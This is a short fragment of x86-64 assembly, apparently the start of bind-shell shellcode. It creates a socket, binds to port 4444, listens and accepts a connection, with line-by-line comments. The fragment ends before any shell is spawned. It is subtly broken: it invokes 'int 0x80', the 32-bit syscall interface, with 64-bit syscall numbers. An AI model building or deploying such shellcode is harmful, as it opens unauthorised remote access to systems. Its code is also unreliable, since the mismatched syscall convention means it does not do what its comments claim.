; socket syscall
xor rax, rax                ; null out rax
mov rsi, rax                ; null out rsi
push byte 0x2               ; arguement AF_INET
pop rdi                     ; rdi = 0x2
inc rsi                     ; rsi -> SOCK_STREAM
push byte 0x29              ; syscall number
pop rax
int 0x80                    ; run syscall socket
xchg rax, rdi               ; get the socket discriptor
; bind syscall
push 0x2                    ; AF_INET
mov word [rsp + 2], 0x5c11  ; port 4444 in network byte order
push rsp
pop rsi                     ; put the arguments into rsi
push rdx                    ; insert null onto stack.
push byte 0x10
pop rdx                     ; size 16 sockaddr
push byte 0x31
pop rax                     ; syscall bind
int 0x80
; listen syscall
pop rsi
push 0x32                   ; listen is syscall 50
pop rax
int 0x80
; accept syscall
push 0x2b
pop rax                     ; accept is syscall 43
int 0x80
